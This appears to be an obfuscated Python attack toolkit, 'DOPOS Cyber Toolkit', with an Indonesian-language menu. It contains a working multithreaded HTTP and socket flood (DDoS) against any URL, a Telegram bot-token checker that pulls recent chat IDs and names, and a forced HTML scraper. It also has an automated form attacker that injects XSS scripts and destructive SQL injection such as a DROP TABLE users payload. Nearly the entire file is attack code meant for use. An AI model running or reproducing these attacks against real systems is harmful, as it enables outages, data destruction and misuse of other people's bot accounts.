A4='BeautifulSoup module not found'
A3='method'
A2='action'
i='form'
h='html.parser'
A1='max-age=0'
A0='keep-alive'
z='gzip, deflate, br'
y='en-US,en;q=0.5'
x='text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
w='Cache-Control'
v='Upgrade-Insecure-Requests'
u='Connection'
t='Accept-Encoding'
s='Accept-Language'
r='Accept'
q='User-Agent'
Y='utf-8'
o='https://'
S='/'
d=enumerate
n=ValueError
m=range
c=ImportError
U='Unknown'
g='1'
f=int
b='id'
a=Exception
W='http://'
V=True
Q=len
N=''
M=input
L=False
G=str
A=print
import os,sys,time as O,random as P,requests as T,threading as j
from urllib.parse import urlparse as e,urljoin
import socket as k,ssl
try:from colorama import init,Fore as J,Back,Style;init(autoreset=V);B=J.CYAN;F=J.BLUE;X=J.LIGHTBLUE_EX;H=J.GREEN;D=J.RED;I=J.YELLOW;E=J.WHITE;A5=J.MAGENTA
except c:B=F=X=H=D=I=E=A5=N
import warnings as A6,urllib3 as R
A6.filterwarnings('ignore',category=R.exceptions.InsecureRequestWarning)
R.disable_warnings(R.exceptions.InsecureRequestWarning)
l=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15','Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15','Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36 Edg/121.0.0.0','Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)']
A7=[S,'/index.html','/home','/admin','/login','/search','/about','/contact','/products','/news','/blog','/forum','/shop','/user','/profile','/dashboard','/settings','/upload','/api','/json','/xml','/rss','/sitemap.xml','/help','/terms','/privacy','/cart','/checkout','/order','/category','/tag','/archive','/gallery','/support','/status','/health','/robots.txt','/.well-known/security.txt']
def A8():
	try:os.system('cls'if os.name=='nt'else'clear')
	except:A('\n'*50)
def p(progress,total,width=50):D=width;C=total;A=progress;F=A/C*100;E=f(D*A//C);G='█'*E+'-'*(D-E);return f"{B}[{G}] {F:.1f}%"
def K(text,duration=2):
	D=duration;C=text;A(f"{B}[+] {C}",end=N)
	for E in m(f(D*10)):F=['\\','|',S,'-','#','@','!','*'];A(f"\r{B}[+] {C} {P.choice(F)} {p(E+1,D*20)}",end=N);O.sleep(.1)
	A(f"\r{H}[+] {C} SUKSES!{B}")
def Z():A8();A(f"""
{D}╔══════════════════════════════════════════════════════════════╗
║  {B}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ {D}           ║
║  {B}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{D}           ║
║  {B}██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝{D}           ║
║  {B}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗{D}           ║
║  {B}██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║{D}           ║
║  {B}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{D}           ║
╚═════════════════════════════════════════════════════════════════
{X}                    DOPOS CYBER TOOLKIT v3.0
{D}═════════════════════════════════════════════════════════════════
{B}[+] Status: {H}READY FOR DESTRUCTION{B}     [+] Mode: {D}ULTRA BRUTAL{B}
{D}═════════════════════════════════════════════════════════════════
""")
def C(message):
	try:
		with open('dopos_log.txt','a',encoding=Y)as A:A.write(f"[{O.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
	except:pass
def A9(target):A=e(target);B=A.hostname or A.netloc.split(':')[0];C=A.path if A.path else S;D=A.port or(443 if A.scheme=='https'else 80);return B,C,D
def AA():
	R='failed';Q='success';Z();A(f"{D}[1] DODOS SERANG - ULTRA BRUTAL MODE");A(f"{F}═════════════════════════════════════════════════════════════════");S=M(f"{B}[?] Masukkan URL target: {E}")
	try:
		U=f(M(f"{B}[?] Durasi serangan (detik, 1-300): {E}"));X=f(M(f"{B}[?] Jumlah thread (1-100): {E}"))
		if X<=0 or X>100:raise n('Jumlah thread harus antara 1 dan 100')
		if U<=0 or U>300:raise n('Durasi harus antara 1 dan 300 detik')
	except n as h:A(f"{D}[!] Input tidak valid: {G(h)}");M(f"\n{B}[+] Tekan Enter untuk kembali...");return
	if not S.startswith((W,o)):S=W+S
	Y,A3,c=A9(S);A(f"\n{D}[!] MEMULAI SERANGAN ULTRA BRUTAL...");A(f"{I}[!] Target: {E}{S}");A(f"{I}[!] Domain: {E}{Y}");A(f"{I}[!] Port: {E}{c}");A(f"{I}[!] Durasi: {E}{U} detik");A(f"{I}[!] Thread: {E}{X}");C(f"Starting DDoS attack on {S} (Domain: {Y}, Port: {c}, Duration: {U}s, Threads: {X})");J={Q:0,R:0};i=j.Lock()
	def A4():
		M='POST';K='abcdefghijklmnopqrstuvwxyz0123456789';W=O.time()+U;F=T.Session()
		while O.time()<W:
			try:
				G={q:P.choice(l),r:x,s:y,t:z,u:A0,v:g,w:A1,'Referer':S,'DNT':g};X=P.choice(A7);D=S+X;Y={'q':N.join(P.choices(K,k=10)),b:P.randint(100000,999999),'page':P.randint(1,10000)};E=P.choice(['GET',M,'HEAD'])
				if E==M:Z={'data':N.join(P.choices(K,k=1000))};I=F.post(D,headers=G,data=Z,timeout=5,verify=L,allow_redirects=V)
				else:I=F.request(E,D,headers=G,params=Y,timeout=5,verify=L,allow_redirects=V)
				with i:J[Q]+=1;A(f"\r{B}[+] HTTP Attack: {H}Sent {J[Q]} requests | Failed: {J[R]}",end=N);C(f"HTTP {E} request to {D} succeeded (Status: {I.status_code})")
			except:
				with i:J[R]+=1;A(f"\r{B}[+] HTTP Attack: {H}Sent {J[Q]} requests | Failed: {J[R]}",end=N)
				continue
	def A5():
		G=O.time()+U
		while O.time()<G:
			try:
				D=k.socket(k.AF_INET,k.SOCK_STREAM);D.settimeout(5)
				if c==443:F=ssl.create_default_context();F.check_hostname=L;F.verify_mode=ssl.CERT_NONE;D=F.wrap_socket(D,server_hostname=Y)
				D.connect((Y,c));E=f"GET {A3}?{P.randint(100000,9999999)} HTTP/1.1\r\n";E+=f"Host: {Y}\r\n";E+=f"User-Agent: {P.choice(l)}\r\n";E+=f"Accept: */*\r\n";E+=f"Connection: keep-alive\r\n\r\n";D.send(E.encode());D.send(P.randbytes(1000));O.sleep(.01);D.close()
				with i:J[Q]+=1;A(f"\r{B}[+] Socket Attack: {H}Sent {J[Q]} requests | Failed: {J[R]}",end=N);C(f"Socket request to {Y}:{c} succeeded")
			except:
				with i:J[R]+=1;A(f"\r{B}[+] Socket Attack: {H}Sent {J[Q]} requests | Failed: {J[R]}",end=N)
				continue
	K('Inisialisasi serangan',2);A2=O.time()
	for _ in m(X//2):d=j.Thread(target=A4);d.daemon=V;d.start()
	for _ in m(X//2):d=j.Thread(target=A5);d.daemon=V;d.start()
	while O.time()<A2+U:A6=O.time()-A2;A(f"\r{B}[+] Progress: {p(A6,U)} | Requests: {J[Q]} | Failed: {J[R]}",end=N);O.sleep(.5)
	A(f"\n{H}[+] SERANGAN SELESAI!");A(f"{D}[!] Target telah dihancurkan!");A(f"{B}[+] Total Requests: {H}{J[Q]} successful, {I}{J[R]} failed");C(f"Attack finished. Total: {J[Q]} successful, {J[R]} failed")
	try:
		K('Memeriksa status target',3);e=T.get(S,timeout=15,verify=L)
		if e.status_code==200:A(f"{I}[!] Target masih aktif, tapi mungkin lambat");A(f"{B}[+] Response time: {E}{e.elapsed.total_seconds()} detik");C(f"Target check: Still active, response time {e.elapsed.total_seconds()}s")
		else:A(f"{H}[+] Target down! Status code: {e.status_code}");C(f"Target check: Down, status code {e.status_code}")
	except T.exceptions.Timeout:A(f"{H}[+] Target timeout! Serangan berhasil!");C('Target check: Timeout')
	except T.exceptions.ConnectionError:A(f"{H}[+] Target tidak bisa diakses! Serangan berhasil!");C('Target check: Connection error')
	except a as h:A(f"{H}[+] Target error: {G(h)}");C(f"Target check: Error {G(h)}")
	M(f"\n{B}[+] Tekan Enter untuk kembali...")
def AB():
	d='message';c='Tidak';Y='username';Q='first_name';P='result';Z();A(f"{B}[2] LACAK TOKEN BOT - MODE BRUTAL");A(f"{F}═════════════════════════════════════════════════════════════════");N=M(f"{B}[?] Masukkan token BOT: {E}")
	if not N:A(f"{D}[!] Token tidak boleh kosong!");M(f"\n{B}[+] Tekan Enter untuk kembali...");return
	K('Memverifikasi token',2);C(f"Checking Telegram bot token: {N[:10]}...")
	try:
		e=f"https://api.telegram.org/bot{N}/getMe";R=T.get(e,timeout=5,verify=L)
		if R.status_code==200:
			S=R.json()
			if S['ok']:
				J=S[P];A(f"\n{H}[+] TOKEN VALID!");A(f"{F}═════════════════════════════════════════════════════════════════");A(f"{B}║ {'Nama BOT'.ljust(20)} : {E}{J[Q].ljust(37)} ║");A(f"{B}║ {'Username'.ljust(20)} : {E}@{J[Y].ljust(36)} ║");A(f"{B}║ {'ID'.ljust(20)} : {E}{G(J[b]).ljust(37)} ║");A(f"{B}║ {'Bisa bergabung'.ljust(20)} : {E}{'Ya'.ljust(37)if J['can_join_groups']else c.ljust(37)} ║");A(f"{B}║ {'Bisa baca pesan'.ljust(20)} : {E}{'Ya'.ljust(37)if J.get('can_read_all_group_messages',L)else c.ljust(37)} ║");A(f"{F}═════════════════════════════════════════════════════════════════");C(f"Bot token valid: @{J[Y]} (ID: {J[b]})");K('Mengambil data chat',2);f=f"https://api.telegram.org/bot{N}/getUpdates";V=T.get(f,timeout=5,verify=L).json()
				if V[P]:
					A(f"\n{D}[!] CHAT TERAKHIR TERDETEKSI:");A(f"{F}═════════════════════════════════════════════════════════════════")
					for W in V[P][:3]:
						if d in W:O=W[d]['chat'];A(f"{I}║ {'ID'.ljust(10)} : {E}{G(O[b]).ljust(20)} | {'Nama'.ljust(10)} : {E}{O.get(Q,U).ljust(20)} ║");C(f"Chat detected: ID {O[b]}, Name {O.get(Q,U)}")
					A(f"{F}═════════════════════════════════════════════════════════════════")
				else:A(f"\n{I}[!] Tidak ada chat aktif");C('No active chats found')
				A(f"\n{D}[!] PERINGATAN: TOKEN TELAH TERLACAK!")
			else:A(f"\n{D}[!] TOKEN INVALID!");C('Token invalid')
		else:A(f"\n{D}[!] GAGAL TERHUBUNG KE API!");C('Failed to connect to Telegram API')
	except a as X:A(f"\n{D}[!] ERROR: {G(X)}");C(f"Error checking token: {G(X)}")
	M(f"\n{B}[+] Tekan Enter untuk kembali...")
def AC():
	p='title';n='Content-Type';m='Server';Z();A(f"{B}[3] AMBIL DATA HTML PAKSA - MODE BRUTAL");A(f"{F}═════════════════════════════════════════════════════════════════");O=M(f"{B}[?] Masukkan URL target: {E}")
	if not O.startswith((W,o)):O=W+O
	K('Membypass proteksi',2);K('Mengambil data paksa',3);C(f"Scraping HTML from {O}")
	try:
		from bs4 import BeautifulSoup as A5;A6={q:P.choice(l),r:x,s:y,t:z,u:A0,v:g,w:A1,'Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1'};A7=T.Session();J=A7.get(O,headers=A6,timeout=15,verify=L)
		if J.status_code==200:
			K('Menganalisis struktur',2);R=A5(J.text,h);A(f"\n{H}[+] BERHASIL MENGAMBIL DATA HTML!");A(f"{F}═════════════════════════════════════════════════════════════════");A(f"{B}║ {'Status Code'.ljust(20)} : {E}{G(J.status_code).ljust(37)} ║");A(f"{B}║ {'Ukuran Data'.ljust(20)} : {E}{G(Q(J.text)).ljust(37)} bytes ║");A(f"{B}║ {m.ljust(20)} : {E}{J.headers.get(m,U).ljust(37)} ║");A(f"{B}║ {n.ljust(20)} : {E}{J.headers.get(n,U).ljust(37)} ║");A8=R.find(p).text if R.find(p)else'No Title';A(f"{B}║ {'Judul Halaman'.ljust(20)} : {E}{A8[:37].ljust(37)} ║");V=R.find_all(i);A(f"{B}║ {'Jumlah Form'.ljust(20)} : {E}{G(Q(V)).ljust(37)} ║");X=R.find_all('input');A(f"{B}║ {'Jumlah Input'.ljust(20)} : {E}{G(Q(X)).ljust(37)} ║");b=R.find_all('a');A(f"{B}║ {'Jumlah Link'.ljust(20)} : {E}{G(Q(b)).ljust(37)} ║");A(f"{F}═════════════════════════════════════════════════════════════════");C(f"HTML scraped: Status {J.status_code}, Forms {Q(V)}, Inputs {Q(X)}, Links {Q(b)}")
			if V:
				A(f"\n{D}[!] FORM TERDETEKSI (POTENSI KERENTANAN):");A(f"{F}═════════════════════════════════════════════════════════════════")
				for(e,f)in d(V[:3]):j=f.get(A2,N);k=f.get(A3,'get');A(f"{I}║ Form {e+1}: {E}Action={j[:30].ljust(30)} | Method={k.ljust(10)} ║");C(f"Form {e+1}: Action={j}, Method={k}")
				A(f"{F}═════════════════════════════════════════════════════════════════")
			try:
				with open('target_dump.html','w',encoding=Y)as A9:A9.write(J.text)
				A(f"\n{H}[+] Data telah disimpan ke: target_dump.html");C('HTML saved to target_dump.html')
			except a as S:A(f"{I}[!] Gagal menyimpan file: {G(S)}");C(f"Failed to save HTML: {G(S)}")
			A(f"{D}[!] SIAP UNTUK DIMANIPULASI!")
		else:A(f"\n{D}[!] GAGAL: Status Code {J.status_code}");C(f"Failed to scrape HTML: Status {J.status_code}")
	except c:A(f"\n{D}[!] Modul BeautifulSoup tidak ditemukan! Instal bs4 terlebih dahulu.");C(A4)
	except a as S:A(f"\n{D}[!] ERROR: {G(S)}");C(f"Error scraping HTML: {G(S)}")
	M(f"\n{B}[+] Tekan Enter untuk kembali...")
def AD():
	s='error';r='post';q="<script>alert('DOPOS HACKED!');</script>";p='text';n='name';f='Status';Z();A(f"{D}[4] MERUSAK DATA SCRIPT ONLINE - MODE BRUTAL");A(f"{F}═════════════════════════════════════════════════════════════════");R=M(f"{B}[?] Masukkan URL target: {E}")
	if not R.startswith((W,o)):R=W+R
	K('Menganalisis target',2);K('Mempersiapkan payload',3);C(f"Starting vulnerability test on {R}")
	try:
		from bs4 import BeautifulSoup as t;U=T.Session();J=U.get(R,timeout=15,verify=L);u=t(J.text,h);g=u.find_all(i)
		if g:
			A(f"\n{H}[+] FORM TERDETEKSI - SIAP DIMANIPULASI!");A(f"{F}═════════════════════════════════════════════════════════════════")
			for(V,X)in d(g):
				v=X.get(A2,N);Y=X.get(A3,'get').lower();S=urljoin(R,v);A(f"\n{B}FORM {V+1}:");A(f"{F}═════════════════════════════════════════════════════════════════");A(f"{I}║ {'Action'.ljust(20)} : {E}{S[:37].ljust(37)} ║");A(f"{I}║ {'Method'.ljust(20)} : {E}{Y.ljust(37)} ║");A(f"{F}═════════════════════════════════════════════════════════════════");C(f"Form {V+1}: Action={S}, Method={Y}");w=X.find_all('input');x=X.find_all('textarea');O={}
				for b in w:
					P=b.get(n)
					if not P:continue
					e=b.get('type',p);y=b.get('value',N)
					if e==p:O[P]=q
					elif e=='hidden':O[P]=y
					elif e=='password':O[P]="' OR '1'='1"
					else:O[P]='DOPOS_BRUTAL'
				for z in x:
					P=z.get(n)
					if P:O[P]="<script>alert('XSS!');</script>"
				K('Mengirim payload berbahaya',2)
				if Y==r:J=U.post(S,data=O,timeout=15,verify=L)
				else:J=U.get(S,params=O,timeout=15,verify=L)
				A(f"{H}[+] Payload terkirim!");A(f"{B}║ {f.ljust(20)} : {E}{G(J.status_code).ljust(37)} ║");A(f"{F}═════════════════════════════════════════════════════════════════");C(f"Payload sent to {S}, Status: {J.status_code}")
				if q in J.text:A(f"{D}[!] BERHASIL! KERENTANAN XSS TERKONFIRMASI!");C('XSS vulnerability confirmed')
				elif s in J.text.lower()or'mysql'in J.text.lower():A(f"{D}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!");C('SQLi vulnerability confirmed')
				else:
					A(f"{I}[!] Gagal, mencoba payload lain...");C('Initial payload failed, trying SQLi payload')
					for P in O:O[P]="'; DROP TABLE users; --"
					K('Mengirim payload SQLi',2)
					if Y==r:J=U.post(S,data=O,timeout=15,verify=L)
					else:J=U.get(S,params=O,timeout=15,verify=L)
					A(f"{B}║ {f.ljust(20)} : {E}{G(J.status_code).ljust(37)} ║");A(f"{F}═════════════════════════════════════════════════════════════════");C(f"SQLi payload sent, Status: {J.status_code}")
					if s in J.text.lower():A(f"{D}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!");C('SQLi vulnerability confirmed with second payload')
					else:A(f"{I}[!] Target terlindungi");C('Target protected from SQLi')
		else:
			A(f"\n{I}[!] Tidak ada form yang terdeteksi");A(f"{B}[+] Mencoba metode lain...");C('No forms detected, trying direct XSS');j=["<script>alert('XSS')</script>","javascript:alert('XSS')","<img src=x onerror=alert('XSS')>","<svg onload=alert('XSS')>",'\'"><script>alert(\'XSS\')</script>',"<iframe src=javascript:alert('XSS')>","<body onload=alert('XSS')>"]
			for(V,k)in d(j):
				l=f"{R}?q={k}";K(f"Menguji payload XSS {V+1}/{Q(j)}",1);J=U.get(l,timeout=10,verify=L);A(f"{B}║ {f.ljust(20)} : {E}{G(J.status_code).ljust(37)} ║");A(f"{F}═════════════════════════════════════════════════════════════════");C(f"XSS payload {V+1} sent to {l}, Status: {J.status_code}")
				if k in J.text:A(f"{D}[!] BERHASIL! KERENTANAN XSS TERDETEKSI!");C('XSS vulnerability detected with direct payload');break
			else:A(f"{I}[!] Target aman dari serangan langsung");C('Target protected from direct XSS')
		A(f"\n{D}[!] PROSES PERUSAKAN SELESAI!");A(f"{H}[+] Target telah dieksploitasi!");C('Vulnerability test completed')
	except c:A(f"\n{D}[!] Modul BeautifulSoup tidak ditemukan! Instal bs4 terlebih dahulu.");C(A4)
	except a as m:A(f"\n{D}[!] ERROR: {G(m)}");C(f"Error during vulnerability test: {G(m)}")
	M(f"\n{B}[+] Tekan Enter untuk kembali...")
def AE():
	while V:
		Z();A(f"{B}[+] PILIHAN SERANGAN BRUTAL:");A(f"{F}═════════════════════════════════════════════════════════════════");A(f"{D}║ [1] Dodos Serang (HTTP/Socket Flood)                       ║");A(f"{D}║ [2] Lacak Token BOT                                        ║");A(f"{D}║ [3] Ambil Data HTML Paksa                                  ║");A(f"{D}║ [4] Merusak Data Script Online                             ║");A(f"{D}║ [5] Keluar                                                 ║");A(f"{F}═════════════════════════════════════════════════════════════════");G=M(f"{B}[?] Pilih serangan: {E}")
		if G==g:AA()
		elif G=='2':AB()
		elif G=='3':AC()
		elif G=='4':AD()
		elif G=='5':A(f"\n{D}[!] DOPOS BRUTAL MODE DIMATIKAN");A(f"{B}[+] Membersihkan jejak...");K('Menghapus log',2);K('Menghancurkan bukti',3);A(f"\n{H}[+] SISTEM AMAN!");C('Program terminated');break
		else:A(f"\n{D}[!] PILIHAN TIDAK VALID!");O.sleep(1)
if __name__=='__main__':C('DOPOS Cyber Toolkit started');AE()